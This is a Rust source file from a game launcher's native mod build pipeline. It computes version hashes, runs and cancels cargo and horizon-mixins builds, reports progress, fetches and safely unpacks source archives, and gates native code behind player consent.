/// The installed version `bundles` built on Horizon `revision` with horizon-mixins `mixins`
/// become: `native-<7 digits of the revision>-<12 hex digits>`. The two targets' keys never mix:
/// a server build salts its hash, so it is another version than the client build of the same
/// mods.
pub fn version_for(
    revision: &str,
    mixins: &str,
    profile: Profile,
    target: Target,
    platform: Option<&str>,
    bundles: &[Bundle],
) -> Result<String, String> {
    let mut hash = Sha256::new();
    let (cargo_profile, configs) = profile.cargo();
    for part in [STAGING, mixins, cargo_profile]
        .into_iter()
        .chain(configs.iter().copied())
        .chain([rust_toolchain::VERSION, revision])
        .chain(platform)
    {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    if target == Target::Server {
        hash.update(target.name().as_bytes());
        hash.update([0]);
    }
    // bundles() reads folders in path order, which with their manifests decides trait dispatch
    // order: hashed in that order, a different order is another build.
    for b in bundles {
        hash.update(b.manifest.id.as_bytes());
        hash.update([0]);
        for (name, path) in bundle_files(b)? {
            let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
            hash.update(name.as_bytes());
            hash.update((bytes.len() as u64).to_le_bytes());
            hash.update(&bytes);
        }
    }
    let key: String = hash.finalize()[..6]
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    Ok(format!("{PREFIX}{}-{key}", &revision[..7]))
}

/// A digest of a mod's files (name, length, bytes, sorted by name), kept in `native-mods.json` so
/// the Mods page sees a mod edited or reinstalled without a version bump.
pub fn digest<'a>(files: impl Iterator<Item = (&'a str, &'a [u8])>) -> String {
    let mut hash = Sha256::new();
    for (name, bytes) in files {
        hash.update(name.as_bytes());
        hash.update((bytes.len() as u64).to_le_bytes());
        hash.update(bytes);
    }
    hash.finalize().iter().map(|b| format!("{b:02x}")).collect()
}

/// The selected flat files, in the same order as `native_status::enabled` hashes an archive.
/// A build records this digest so an unchanged installed mod reads as up to date.
fn source_digest(bundle: &Bundle) -> Option<String> {
    let paths = bundle_files(bundle);
    let read: Vec<_> = paths
        .ok()?
        .into_iter()
        .map(|(name, path)| Some((name, fs::read(path).ok()?)))
        .collect::<Option<_>>()?;
    Some(digest(read.iter().map(|(n, b)| (n.as_str(), b.as_slice()))))
}

/// Where a build is.
#[derive(Clone, Debug, PartialEq)]
pub enum Step {
    Rust(f32),
    Tool,
    Source(String),
    Mixins,
    /// A previously patched source snapshot was reused.
    CachedMixins,
    /// Which case the build is, before anything runs.
    Plan(Plan, Profile),
    /// Crates done, the total once cargo says it, and the one just started.
    Compile {
        done: usize,
        total: Option<usize>,
        name: String,
        profile: Profile,
    },
    /// The mods' own crates checked against Horizon's `Cargo.lock`.
    Crates,
    /// The prebuilt game at a revision downloads (once).
    PrebuiltGame(String),
    /// The mods compile against the prebuilt game.
    PrebuiltMods,
    Install,
    /// This mod was left out of the build.
    LeftOut(LeftOut),
    /// The build ended: seconds it took.
    Done {
        secs: u64,
        profile: Profile,
        plan: Plan,
    },
}

/// The three stages a build passes through, as the Mods page's pills show them.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Stage {
    /// Tools, source and the prebuilt game fetched and made ready.
    Prepare,
    /// The game and the mods compile.
    Compile,
    /// The build is put in place for the instance.
    Install,
}

impl Stage {
    pub const ALL: [Self; 3] = [Self::Prepare, Self::Compile, Self::Install];

    pub fn label(self) -> &'static str {
        match self {
            Self::Prepare => tr("Prepare"),
            Self::Compile => tr("Compile"),
            Self::Install => tr("Install"),
        }
    }
}

/// How far a build is: its stage, and how much of the whole when that is known.
#[derive(Clone, Copy, Debug, PartialEq)]
pub struct Progress {
    pub stage: Stage,
    /// 0 to 1 within the stage, when the step reports it.
    pub fraction: Option<f32>,
}

impl Step {
    pub fn progress(&self) -> Progress {
        let (stage, fraction) = match self {
            Self::Rust(done) => (Stage::Prepare, Some(*done)),
            Self::Tool
            | Self::Source(_)
            | Self::Mixins
            | Self::CachedMixins
            | Self::Plan(..)
            | Self::Crates
            | Self::LeftOut(_)
            | Self::PrebuiltGame(_) => (Stage::Prepare, None),
            Self::Compile { done, total, .. } => (
                Stage::Compile,
                total.filter(|t| *t > 0).map(|t| *done as f32 / t as f32),
            ),
            Self::PrebuiltMods => (Stage::Compile, None),
            Self::Install => (Stage::Install, None),
            Self::Done { .. } => (Stage::Install, Some(1.)),
        };
        Progress { stage, fraction }
    }

    pub fn label(&self) -> String {
        match self {
            Self::Rust(done) => trf(
                "Downloading Rust {version} (once): {done}%",
                &[
                    ("version", rust_toolchain::VERSION),
                    ("done", &format!("{:.0}", done * 100.0)),
                ],
            ),
            Self::Tool => tr("Building horizon-mixins (once)").into(),
            Self::Source(revision) => trf(
                "Downloading Horizon's source at {revision}",
                &[("revision", &revision[..7])],
            ),
            Self::Mixins => tr("Applying the mixins").into(),
            Self::CachedMixins => tr("Reusing patched game source").into(),
            Self::Crates => tr("Checking native dependency pins and the game graph").into(),
            Self::PrebuiltGame(revision) => trf(
                "Downloading the prebuilt game at {revision} (once)",
                &[("revision", &revision[..7])],
            ),
            Self::PrebuiltMods => tr("Compiling the mods against the prebuilt game").into(),
            Self::Plan(plan, profile) => format!("{} ({})", plan.label(), profile.name()),
            Self::Compile {
                done,
                total,
                name,
                profile,
            } => match total {
                Some(total) => trf(
                    "Compiling the game ({profile}): {done} of {total} crates, now {name}",
                    &[
                        ("profile", profile.name()),
                        ("done", &done.to_string()),
                        ("total", &total.to_string()),
                        ("name", name),
                    ],
                ),
                None => trf(
                    "Compiling the game ({profile}): {done} crates, now {name}",
                    &[
                        ("profile", profile.name()),
                        ("done", &done.to_string()),
                        ("name", name),
                    ],
                ),
            },
            Self::Install => tr("Installing the build").into(),
            Self::LeftOut(left) => left.label(),
            Self::Done { profile, plan, .. } => trf(
                "Built ({profile}, {plan})",
                &[("profile", profile.name()), ("plan", tr(plan.kind()))],
            ),
        }
    }
}

/// Runs `cmd`, its output appended to the build log; `line` sees each line of its standard error.
/// An error ends with its first `error` lines and the last lines: a failed build script's output
/// alone could push the line naming its crate out of the last ones.
fn run(cmd: Command, what: &str, line: impl FnMut(&str)) -> Result<(), String> {
    run_checked(cmd, what, line, None, None).map_err(|e| e.error)
}

/// A failed command, with diagnostic ownership for build isolation.
struct Ran {
    error: String,
    tail: String,
    owners: Vec<String>,
}

fn run_checked(
    mut cmd: Command,
    what: &str,
    mut line: impl FnMut(&str),
    compiler: Option<diagnostics::Compiler<'_>>,
    stdout_file: Option<fs::File>,
) -> Result<(), Ran> {
    let ran = |error: String| Ran {
        error,
        tail: String::new(),
        owners: Vec::new(),
    };
    let mut log = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path())
        .map_err(|e| ran(e.to_string()))?;
    if CANCEL.load(Ordering::Relaxed) {
        return Err(ran(CANCELLED.into()));
    }
    let _ = writeln!(log, "$ {cmd:?}");
    let stdout = if compiler.is_some() {
        cmd.stdout(Stdio::piped());
        Some(log.try_clone().map_err(|e| ran(e.to_string()))?)
    } else {
        cmd.stdout(match stdout_file {
            Some(file) => file,
            None => log.try_clone().map_err(|e| ran(e.to_string()))?,
        });
        None
    };
    #[cfg(unix)]
    std::os::unix::process::CommandExt::process_group(&mut cmd, 0);
    let mut child = cmd
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| ran(app_control(format!("Could not start {what}: {e}"))))?;
    let finished = Arc::new(AtomicBool::new(false));
    let watcher = {
        let (pid, finished) = (child.id(), finished.clone());
        std::thread::spawn(move || {
            while !finished.load(Ordering::Relaxed) {
                if CANCEL.load(Ordering::Relaxed) {
                    kill_tree(pid);
                    return;
                }
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
        })
    };
    std::thread::scope(|scope| {
        let messages = compiler.zip(stdout).map(|(compiler, log)| {
            let input = BufReader::new(child.stdout.take().expect("piped"));
            scope.spawn(move || diagnostics::capture(&compiler, input, log))
        });
        let mut tail = std::collections::VecDeque::new();
        let mut errors = Vec::new();
        let mut blocked = false;
        for text in BufReader::new(child.stderr.take().expect("piped"))
            .lines()
            .map_while(Result::ok)
        {
            if let Some(kept) = log_text(&text) {
                let _ = writeln!(log, "{kept}");
            }
            line(&text);
            blocked |= rust_toolchain::blocked_by_app_control(&text);
            if text.starts_with("error") && errors.len() < 4 {
                errors.push(text.clone());
            }
            if tail.len() == 12 {
                tail.pop_front();
            }
            tail.push_back(text);
        }
        let status = child.wait();
        finished.store(true, Ordering::Relaxed);
        let _ = watcher.join();
        let messages = messages
            .map(|m| m.join().expect("compiler output reader"))
            .unwrap_or_default();
        if CANCEL.load(Ordering::Relaxed) {
            let _ = writeln!(log, "Build cancelled.");
            return Err(ran(CANCELLED.into()));
        }
        let status = status.map_err(|e| ran(e.to_string()))?;
        if status.success() {
            return Ok(());
        }
        let tail: Vec<String> = tail.into();
        let owners = messages.owners();
        let error = diagnostics::with_internals_hint(messages.explain(failure(
            what,
            &status.to_string(),
            &errors,
            &tail,
        )));
        Err(Ran {
            error: match blocked {
                true => with_app_control(error),
                false => app_control(error),
            },
            tail: tail.join("\n"),
            owners,
        })
    })
}

/// What a cancelled build fails with: the card shows no error for it.
pub const CANCELLED: &str = "Build cancelled";

/// Ends the build with [`CANCELLED`] when the player cancelled it: checked between stages and
/// before anything is installed or selected, so a cancel never ends as a finished build.
fn check_cancelled() -> Result<(), String> {
    if CANCEL.load(Ordering::Relaxed) {
        return Err(CANCELLED.into());
    }
    Ok(())
}

static CANCEL: AtomicBool = AtomicBool::new(false);

/// Stops the build under way: its command is killed and the build ends with [`CANCELLED`].
pub fn cancel() {
    CANCEL.store(true, Ordering::Relaxed);
}

/// Ends `pid` and everything it started (cargo's rustc and build scripts).
fn kill_tree(pid: u32) {
    #[cfg(unix)]
    // SAFETY: a negative pid signals the process group `run` made for this command.
    unsafe {
        libc::kill(-(pid as i32), libc::SIGTERM);
    }
    #[cfg(windows)]
    let _ = Command::new("taskkill")
        .args(["/T", "/F", "/PID", &pid.to_string()])
        .status();
}

/// `error` led by what to do when Windows' Smart App Control refused one of the build's
/// programs (#5911): cargo's own lines only say a build script was "never executed".
fn app_control(error: String) -> String {
    match rust_toolchain::blocked_by_app_control(&error) {
        true => with_app_control(error),
        false => error,
    }
}

fn with_app_control(error: String) -> String {
    format!("{}\n\n{error}", rust_toolchain::smart_app_control())
}

/// [`run`]'s error: the `errors` lines not already among the last ones (`tail`), then those.
fn failure(what: &str, status: &str, errors: &[String], tail: &[String]) -> String {
    let end = diagnostic(&tail.join("\n")).unwrap_or_else(|| tail.join("\n"));
    let first: Vec<&str> = errors
        .iter()
        .filter(|e| !tail.contains(e))
        .map(String::as_str)
        .collect();
    let (shown, first) = if first.is_empty() {
        ("The end of its output", String::new())
    } else {
        (
            "Its first errors and the end of its output",
            format!("{}\n…\n", first.join("\n")),
        )
    };
    format!(
        "{what} failed ({status}). {shown}, the whole of it in {}:\n{first}{end}",
        log_path().display()
    )
}

/// Extracts the mod id from a mixin manifest or mod file path (e.g. `.../mixins.incoming/<mod_id>/...`
/// or `.../mods.incoming/<mod_id>/...`).
fn mod_id_from_file(file: &str) -> Option<&str> {
    for prefix in ["mixins.incoming", "mods.incoming"] {
        if let Some(pos) = file.find(prefix) {
            let rest = &file[pos + prefix.len()..];
            let sub = rest.trim_start_matches(['/', '\\']);
            if let Some(end) = sub.find(['/', '\\']) {
                let id = &sub[..end];
                if !id.is_empty() {
                    return Some(id);
                }
            }
        }
    }
    None
}

/// A horizon-mixins diagnostic (`{"code", "message", "file"}`) in one line, led by the mod it
/// names (`mod_id`, its `injection_id`, or extracted from its `file` path for `E_MODULE_CONFLICT`),
/// so a player with several mods sees which one doesn't apply to the build's Horizon: their files'
/// paths are deep in the launcher's folder.
fn diagnostic(text: &str) -> Option<String> {
    let start = text.find('{')?;
    let value: serde_json::Value = serde_json::from_str(&text[start..]).ok()?;
    let mod_id = value["mod_id"]
        .as_str()
        .or_else(|| value["file"].as_str().and_then(mod_id_from_file));
    let culprit = match (mod_id, value["injection_id"].as_str()) {
        (Some(m), Some(i)) => format!("{m} ({i}): "),
        (Some(m), None) => format!("{m}: "),
        _ => String::new(),
    };
    let mut line = format!(
        "{culprit}{}: {}",
        value["code"].as_str()?,
        value["message"].as_str()?
    );
    if let Some(file) = value["file"].as_str() {
        line += &format!(" ({file})");
    }
    Some(line)
}

/// horizon-mixins at commit `rev`, built once with the launcher's cargo (`cargo install --locked`);
/// `progress` hears [`Step::Tool`] only when it is built.
fn tool(rust: &Toolchain, rev: &str, progress: &impl Fn(Step)) -> Result<PathBuf, String> {
    let dir = root().join("tools").join(&rev[..12]);
    let bin = dir
        .join("bin")
        .join(format!("horizon-mixins{}", std::env::consts::EXE_SUFFIX));
    if !bin.is_file() {
        progress(Step::Tool);
        let mut cmd = rust.command(&rust.cargo());
        rust_toolchain::low_priority(&mut cmd);
        rust.configure_cargo(&mut cmd);
        cmd.args([
            "install", "--locked", "--git", MIXINS_GIT, "--rev", rev, "--root",
        ])
        .arg(&dir)
        .arg("horizon-mixins-cli");
        run(cmd, "Building horizon-mixins", |_| {})?;
    }
    crate::storage::mark_used(&dir).map_err(cache_error)?;
    Ok(bin)
}

/// External mixins traverse ordinary module declarations, not generated OUT_DIR includes.
/// Prepare their input separately so neither the downloaded source nor a cached snapshot changes.
fn prepare_mixins_source(source: &Path, prepared: &Path) -> Result<(), String> {
    // sync removes old files, not their directories. A leftover area directory without its
    // marker would make module discovery refuse the next revision after an interrupted build.
    if prepared.exists() {
        fs::remove_dir_all(prepared).map_err(|e| format!("{}: {e}", prepared.display()))?;
    }
    let result = sync(source, prepared)
        .and_then(|()| horizon_platform::mod_build::api_gen::materialize_game_modules(prepared));
    if result.is_err() {
        let _ = fs::remove_dir_all(prepared);
    }
    result
}

/// `horizon-mixins apply`: the mods in `mods` applied to `source`, into `out`. It runs
/// `cargo metadata`, so it gets the launcher's toolchain like a build does: on a computer with no
/// Rust of its own, a plain command found no cargo (E_METADATA).
fn apply(rust: &Toolchain, tool: &Path, source: &Path, mods: &Path, out: &Path) -> Command {
    let mut cmd = rust.command(tool);
    cmd.arg("apply").arg("--workspace").arg(source);
    cmd.arg("--mods").arg(mods).arg("--out").arg(out);
    cmd
}

/// The build of the game in `stage` with `profile` (game-build.yml's, for `Release`) and
/// `target`'s features, into `target`. It starts outside any Cargo configuration of the
/// player's ([`rust_toolchain::outside_configs`]), so only the workspace's own
/// (`stage/.cargo/config.toml`, when it has one) applies. A server build compiles headless:
/// `--no-default-features` (the server build, docs/server.md), keeping the `mods` feature when
/// the source has one.
fn compile(
    rust: &Toolchain,
    stage: &Path,
    target: Target,
    target_dir: &Path,
    profile: Profile,
    package: &str,
) -> Command {
    let mut cmd = cargo(rust, stage, "build");
    // Cargo's progress bar (units done of the total) is read from its output. Incremental
    // compilation, the `fast` profile's, is not turned off by the player's environment: the
    // toolchain's command drops `CARGO_INCREMENTAL` and `CARGO_BUILD_*`.
    cmd.env("CARGO_TARGET_DIR", target_dir)
        .env("CARGO_TERM_PROGRESS_WHEN", "always")
        .env("CARGO_TERM_PROGRESS_WIDTH", "100");
    let (cargo_profile, configs) = profile.cargo();
    cmd.args([
        "--locked",
        "--message-format=json",
        "--profile",
        cargo_profile,
    ]);
    cmd.args(configs.iter().flat_map(|config| ["--config", config]));
    if target == Target::Server {
        cmd.arg("--no-default-features");
    }
    cmd.args(["-p", package, "--bin", api::executable(package)]);
    cmd
}

/// The launcher's cargo running `subcommand` on the workspace `dir`, at low priority, with only
/// the workspace's own Cargo configuration ([`compile`]).
fn cargo(rust: &Toolchain, dir: &Path, subcommand: &str) -> Command {
    let mut cmd = rust.command(&rust.cargo());
    rust_toolchain::low_priority(&mut cmd);
    rust.configure_cargo(&mut cmd);
    cmd.arg(subcommand);
    let config = dir.join(".cargo").join("config.toml");
    if config.is_file() {
        cmd.arg("--config").arg(config);
    }
    cmd.arg("--manifest-path").arg(dir.join("Cargo.toml"));
    cmd
}

fn read_lock(dir: &Path) -> Result<String, String> {
    let path = dir.join("Cargo.lock");
    fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))
}

fn lock_crates(
    rust: &Toolchain,
    game: &registry_lock::RegistryLock,
    stage: &Path,
    allowed: &registry_lock::RegistryLock,
) -> Result<(), String> {
    let text = read_lock(stage)?;
    crates::check_game_graph(stage, &text)?;
    allowed.check_resolution(&registry_lock::RegistryLock::parse(&text)?, game)?;
    let mut fetch = cargo(rust, stage, "fetch");
    fetch.arg("--locked");
    run(fetch, "Downloading the crates", |_| {})
}

/// Horizon's source at commit `revision`: GitHub's archive of it, unpacked once, with the commit in
/// `.horizon-revision` (bundles pin it). A Nightly's commit stays downloadable after the Nightly
/// is gone: its `nightly-source/…` tag keeps it (docs/release-flow.md). Links are left out:
/// horizon-mixins refuses them, and none is needed to build.
fn source_for(base: &str, revision: &str) -> Result<PathBuf, String> {
    let archive = crate::developer_install::is_developer(base)
        .then(|| backend::version_dir(base).join("developer-source.tar"));
    source_or_local(
        archive.as_deref(),
        &root().join("developer-source").join(base),
        revision,
        || source(revision),
    )
}

fn source_or_local(
    archive: Option<&Path>,
    destination: &Path,
    revision: &str,
    remote: impl FnOnce() -> Result<PathBuf, String>,
) -> Result<PathBuf, String> {
    match archive {
        Some(archive) => local_source(archive, destination, revision),
        None => remote(),
    }
}

fn local_source(archive: &Path, destination: &Path, revision: &str) -> Result<PathBuf, String> {
    if destination.join(".horizon-revision").is_file() {
        return Ok(destination.to_owned());
    }
    let parent = destination.parent().unwrap();
    fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    let partial = tempfile::Builder::new()
        .prefix(".source-")
        .tempdir_in(parent)
        .map_err(|e| e.to_string())?;
    let file = fs::File::open(archive).map_err(|e| e.to_string())?;
    unpack_source(file, partial.path())?;
    fs::write(partial.path().join(".horizon-revision"), revision).map_err(|e| e.to_string())?;
    fs::rename(partial.path(), destination).map_err(|e| e.to_string())?;
    Ok(destination.to_owned())
}

fn source(revision: &str) -> Result<PathBuf, String> {
    let dir = root().join("source").join(revision);
    if dir.join(".horizon-revision").is_file() {
        crate::storage::mark_used(&dir).map_err(cache_error)?;
        return Ok(dir);
    }
    let archive = format!(
        "https://codeload.github.com/{}/tar.gz/{revision}",
        horizon_mod_package::index::native::PREBUILT_REPO
    );
    let partial = root().join("source").join(format!(".{revision}.partial"));
    let top = unpack_archive(&archive, &partial, u64::MAX)?;
    fs::write(top.join(".horizon-revision"), revision).map_err(|e| e.to_string())?;
    let _ = fs::remove_dir_all(&dir);
    fs::rename(&top, &dir).map_err(|e| e.to_string())?;
    let _ = fs::remove_dir_all(&partial);
    crate::storage::mark_used(&dir).map_err(cache_error)?;
    Ok(dir)
}

/// GitHub's archive (`.tar.gz`) at `url`, unpacked into the fresh folder `partial`: the archive's
/// one top folder, which is returned. Links are left out; at most `limit` bytes are unpacked.
fn unpack_source(reader: impl std::io::Read, partial: &Path) -> Result<(), String> {
    let mut archive = tar::Archive::new(reader);
    for entry in archive.entries().map_err(|e| e.to_string())? {
        let mut entry =
            entry.map_err(|e| trf("Source interrupted: {error}", &[("error", &e.to_string())]))?;
        let kind = entry.header().entry_type();
        // Match downloaded sources: horizon-mixins refuses links, which the build does not need.
        if !(kind.is_file() || kind.is_dir()) {
            continue;
        }
        if !entry.unpack_in(partial).map_err(|e| {
            trf(
                "Could not unpack the source: {error}",
                &[("error", &e.to_string())],
            )
        })? {
            return Err(tr("The source archive contains a path outside its folder.").into());
        }
    }
    Ok(())
}

pub(crate) fn unpack_archive(url: &str, partial: &Path, limit: u64) -> Result<PathBuf, String> {
    use std::io::Read;
    let _ = fs::remove_dir_all(partial);
    fs::create_dir_all(partial).map_err(|e| e.to_string())?;
    let reader = flate2::read::GzDecoder::new(backend::get(url)?.into_reader()).take(limit);
    unpack_source(reader, partial)?;
    // The archive's one top folder (<repo>-<commit>/) is the source's root.
    fs::read_dir(partial)
        .map_err(|e| e.to_string())?
        .flatten()
        .map(|e| e.path())
        .find(|p| p.is_dir())
        .ok_or_else(|| "The source archive is empty.".into())
}

/// Makes `to` hold `from`'s files, writing only those that changed, so Cargo, which goes by file
/// times, recompiles only what the mods changed. A file written gets the current time, not
/// `from`'s: a copy keeps the original's time on Windows and macOS, and an unpacked source has
/// its commit's, which can be older than the last build. Cargo would take that file for one it
/// already compiled and link the older crate (#10421).
fn sync(from: &Path, to: &Path) -> Result<(), String> {
    let new = files(from)?;
    let old = if to.is_dir() { files(to)? } else { Vec::new() };
    for (name, path) in &new {
        let target = to.join(name);
        if fs::read(&target).ok() != fs::read(path).ok() {
            fs::create_dir_all(target.parent().unwrap_or(to)).map_err(|e| e.to_string())?;
            fs::copy(path, &target)
                .and_then(|_| fs::File::options().write(true).open(&target))
                .and_then(|file| file.set_modified(std::time::SystemTime::now()))
                .map_err(|e| format!("{}: {e}", target.display()))?;
        }
    }
    for (name, path) in old {
        if new.binary_search_by(|(n, _)| n.cmp(&name)).is_err() {
            let _ = fs::remove_file(path);
        }
    }
    Ok(())
}

/// Marks a `stage/` whose files all got the time they were written ([`sync`]).
const STAGE_STAMPED: &str = "stage.stamped";

/// The stage the compiler reads, in `root`. One written before #10421 can hold files with their
/// commit's time over crates compiled from another commit: it is written again, once, so each of
/// its files is newer than what `target/` holds.
fn stage_dir(root: &Path) -> Result<PathBuf, String> {
    let stage = root.join("stage");
    let stamped = root.join(STAGE_STAMPED);
    if !stamped.exists() {
        if stage.exists() {
            fs::remove_dir_all(&stage).map_err(|e| format!("{}: {e}", stage.display()))?;
        }
        fs::write(&stamped, "").map_err(|e| format!("{}: {e}", stamped.display()))?;
    }
    Ok(stage)
}

/// Copy a bundle without its API package's Cargo build output.
fn copy_bundle(bundle: &Bundle, to: &Path) -> Result<(), String> {
    package::copy(bundle, to)
}

/// Stage supporting modules for horizon-mixins, after unified injects are prepared.
fn stage_mixins(mods: &[Bundle], to: &Path) -> Result<Vec<Bundle>, String> {
    if to.exists() {
        fs::remove_dir_all(to).map_err(|e| e.to_string())?;
    }
    fs::create_dir_all(to).map_err(|e| e.to_string())?;
    let mut staged = Vec::new();
    for bundle in mods.iter().filter(|bundle| bundle.needs_mixins()) {
        let dir = to.join(&bundle.manifest.id);
        package::copy_tool_input(bundle, &dir)?;
        let copied = Bundle {
            dir,
            ..bundle.clone()
        };
        package::tool_manifest(&copied)?;
        staged.push(copied);
    }
    Ok(staged)
}

/// What a build of `folder`'s mods came out as: the version it installed and what it did.
#[derive(Clone, Debug)]
struct Built {
    version: String,
    /// Which case the build was, said before anything ran.
    plan: Plan,
    /// The profile it compiled with.
    profile: Profile,
    /// How long the whole build took.
    secs: u64,
    /// The mods turned on that it was built without.
    left_out: Vec<LeftOut>,
}

/// Why a native build or internals check stopped.
#[derive(Debug)]
pub enum Failed {
    /// No native-code permission has been recorded for this install.
    NoConsent,
    /// These mods stopped it (`error` says how), while `compiling` or before: it can run again
    /// without them.
    Mods {
        left: Vec<LeftOut>,
        error: String,
        compiling: bool,
    },
    /// Every mod was left out.
    Nothing,
    Other(String),
}

impl From<String> for Failed {
    fn from(error: String) -> Self {
        Self::Other(error)
    }
}

impl std::fmt::Display for Failed {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Mods { error, .. } | Self::Other(error) => f.write_str(error),
            Self::Nothing => Ok(()),
            Self::NoConsent => f.write_str(tr("Native mods run inside your game with your rights; mixins compile code into the game. Allow native mods in Settings, Storage, or pass --trust-native-code.")),
        }
    }
}
impl std::error::Error for Failed {}
impl From<Failed> for String {
    fn from(failed: Failed) -> Self {
        failed.to_string()
    }
}

/// Refuse before staging, fetching a prebuilt game or downloading a compiler.
pub fn require_consent() -> Result<(), Failed> {
    if backend::Settings::load().native_mods_allowed_at.is_some() {
        Ok(())
    } else {
        Err(Failed::NoConsent)
    }
}

/// Isolation and jar-download choices for an explicit build.
#[derive(Default)]
struct BuildOptions<'a> {
    allow_jar_downloads: bool,
    skip: &'a [LeftOut],
    isolate: bool,
    registry_consent: Option<&'a dyn Fn(&RegistryInventory) -> bool>,
}

/// The pipeline both targets build with ([`build`], [`build_server`]): `folder`'s mods on the
/// Horizon revision they pin (else `base`'s, the installed version whose game files the build
/// reuses: a native build's own revision when it is one, [`base_for`]), compiled as `target`
/// (the game, or the headless engine) and installed as its own version,
/// `native-<revision>-<key>` (the key hashes the revision, the mods' files, the tool's commit,
/// the profile and the target). A build already made is used again. A mod pinned to another
/// Horizon revision is refused: the error starts with [`MISMATCH`] and names the mismatched pins.
/// Building never changes a mod's Horizon pin to match the installed game. Isolation leaves out
/// only a mod blamed by mixin or compiler diagnostics and its required dependents; servers refuse
/// failures without leaving anything out.
/// Nothing of the player's outside the launcher's data is touched: no instance is edited and
/// no version selected here.
fn pipeline(
    base: &str,
    folder: &Path,
    profile: Profile,
    target: Target,
    options: BuildOptions<'_>,
    progress: &impl Fn(Step),
) -> Result<Built, Failed> {
    let started = std::time::Instant::now();
    let built_on = checked_about(base)?;
    backend::need_prepared(base)?;
    let platform = platform_for_game(base)?;
    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
    // The mods are copied first: the build and its key use the copy, whatever happens to the
    // folder meanwhile.
    let incoming = root().join("mods.incoming");
    let _ = fs::remove_dir_all(&incoming);
    let found = scan_bundles(folder)?;
    if found.is_empty() {
        return Err(Failed::Nothing);
    }
    // A native build starts from the release or Nightly it was made from, on its own revision.
    let origin = built_on.as_ref().map_or(base, |a| a.base.as_str());
    let mut ids = std::collections::HashSet::new();
    for b in &found {
        if !ids.insert(&b.manifest.id) {
            return Err(format!("Duplicate native mod id {:?}.", b.manifest.id).into());
        }
        copy_bundle(b, &incoming.join(&b.manifest.id))?;
    }
    let digests: std::collections::HashMap<String, Option<String>> = found
        .iter()
        .map(|b| (b.manifest.id.clone(), source_digest(b)))
        .collect();
    let mods: Vec<Bundle> = found
        .into_iter()
        .map(|b| Bundle {
            dir: incoming.join(&b.manifest.id),
            ..b
        })
        .collect();
    let declared: Vec<Vec<dependencies::Dependency>> = mods
        .iter()
        .map(|bundle| dependencies::from_manifest(&bundle.manifest.dependencies))
        .collect();
    // The cache identifies every requested input, including a mod left out after a failure:
    // replacing its files must retry it rather than reuse a build that excluded the old copy.
    let requested = mods.clone();
    let pairs: Vec<(&Bundle, &[dependencies::Dependency])> = mods
        .iter()
        .zip(&declared)
        .map(|(b, d)| (b, d.as_slice()))
        .collect();
    let left_out = isolate::with_dependents(options.skip, &pairs);
    let (mods, declared): (Vec<Bundle>, Vec<Vec<dependencies::Dependency>>) = mods
        .into_iter()
        .zip(declared)
        .filter(|(b, _)| !left_out.iter().any(|l| l.id == b.manifest.id))
        .unzip();
    if mods.is_empty() {
        return Err(Failed::Nothing);
    }
    let inputs: Vec<_> = mods
        .iter()
        .zip(&declared)
        .map(|(bundle, deps)| dependencies::Mod {
            id: &bundle.manifest.id,
            version: &bundle.manifest.version,
            has_api: true,
            dependencies: deps,
        })
        .collect();
    let resolution = dependencies::resolve(&inputs).map_err(|e| e.to_string())?;
    let ordered: Vec<Bundle> = resolution.order.iter().map(|&i| mods[i].clone()).collect();
    let projects: Vec<_> = mods
        .iter()
        .map(api::Project::read)
        .collect::<Result<_, _>>()
        .map_err(|error| error.to_string())?;
    for bundle in &ordered {
        if !bundle.manifest.internals.is_empty() {
            let paths = bundle
                .manifest
                .internals
                .iter()
                .map(|internal| internal.path.as_str())
                .collect::<Vec<_>>()
                .join(", ");
            append_log(&trf(
                "{mod} uses {count} game internals: {paths}",
                &[
                    ("mod", &bundle.manifest.id),
                    ("count", &bundle.manifest.internals.len().to_string()),
                    ("paths", &paths),
                ],
            ))?;
        }
    }
    let revision = build_revision(base, built_on.as_ref())?;
    let other = mismatch(&mods, &revision);
    if let Some(list) = &other {
        return Err(mismatch_error(list).into());
    }
    if target == Target::Server {
        let jars = horizon_mod_package::manifest::collect_jar_requirements(
            mods.iter()
                .map(|bundle| (bundle.manifest.id.as_str(), bundle.manifest.jar.as_slice())),
        )
        .map_err(|error| crate::jars::LaunchError::Conflict(error).to_string())?;
        crate::jars::prepare(
            &backend::game_home(),
            &jars,
            crate::jars::Permission::headless(options.allow_jar_downloads),
        )
        .map_err(|error| error.to_string())?;
    }
    // Said with a failure: a mod made for another revision may not apply or compile on this one.
    let blame = |e: String| {
        match &other {
        Some(list) => format!(
            "{e}\n\nSome mods were made for other Horizon versions ({list}), which may be why. Install versions made for the same Nightly."
        ),
        None => e,
    }
    };
    let mixins = newest(
        &mods,
        "horizon-mixins",
        |b| Some(&b.native().mixins),
        || Ok(MIXINS_REV.into()),
        Some(MIXINS_REV),
        |r| committed("horizon-rust/horizon-mixins", r),
    )?;
    // Keep developer provenance distinct from a signed base at the same source commit.
    let developer_key = crate::developer_install::is_developer(origin)
        .then(|| format!("{}:{origin}", platform.cache_key().unwrap_or_default()));
    let version = version_for(
        &revision,
        &mixins,
        profile,
        target,
        developer_key.as_deref().or(platform.cache_key()),
        &requested,
    )?;
    let now = Record {
        horizon: revision.clone(),
        mixins: mixins.clone(),
        mods: mods
            .iter()
            .map(|m| Ok((m.manifest.id.clone(), mod_hash(m)?)))
            .collect::<Result<_, String>>()?,
    };
    let exists = target.directory(&version).join(".installed").is_file();
    // The route, chosen before anything compiles: the prebuilt game when it serves these mods.
    let prebuilt = if exists
        || profile != Profile::Optimized
        || crate::developer_install::is_developer(origin)
    {
        None
    } else {
        let game = match prebuilt::refusal(&projects) {
            Some(reason) => Err(reason),
            None => match prebuilt::fetch(&revision, target, || {
                progress(Step::PrebuiltGame(revision.clone()))
            })? {
                Ok(game) => match prebuilt::source_refusal(&game, &projects)? {
                    Some(reason) => Err(reason),
                    None => Ok(game),
                },
                Err(reason) => Err(reason),
            },
        };
        prebuilt::or_source(game)?
    };
